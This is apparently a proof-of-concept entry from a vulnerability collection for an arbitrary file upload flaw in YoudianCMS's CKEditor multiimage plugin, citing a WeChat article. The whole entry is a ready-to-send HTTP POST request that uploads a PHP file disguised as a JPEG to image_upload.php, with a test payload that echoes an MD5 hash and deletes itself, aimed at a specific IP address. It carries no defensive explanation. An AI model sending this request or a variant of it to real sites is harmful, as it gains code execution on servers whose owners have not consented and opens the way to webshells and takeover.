# youdiancms_image_upload_php_fileupload
from: https://mp.weixin.qq.com/s/XCiJvX9Ys2q9szXh4Hnxag
2024.02.26 @2
```
POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1
Host: 43.138.240.106:9876
Content-Type: multipart/form-data;boundary=----WebKitFormBoundarydAPjrmyKewWuf59H
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 222

------WebKitFormBoundarydAPjrmyKewWuf59H
Content-Disposition: form-data; name="files"; filename="ceshi.php"
Content-Type: image/jpg

<?php echo md5('666');unlink(__FILE__);?>
------WebKitFormBoundarydAPjrmyKewWuf59H--
```
